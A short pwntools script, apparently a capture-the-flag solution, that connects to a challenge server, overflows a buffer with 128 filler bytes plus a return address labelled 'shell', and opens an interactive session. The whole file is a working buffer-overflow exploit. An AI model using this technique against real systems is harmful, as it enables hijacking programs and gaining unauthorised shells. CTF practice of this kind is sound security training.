from pwn import * 

p = remote("challenges.isictf.live",1202)


shell = p32(0x080491d6) 
print(shell)
paylaod = b'A'*128 + shell
p.sendline(paylaod)
p.interactive()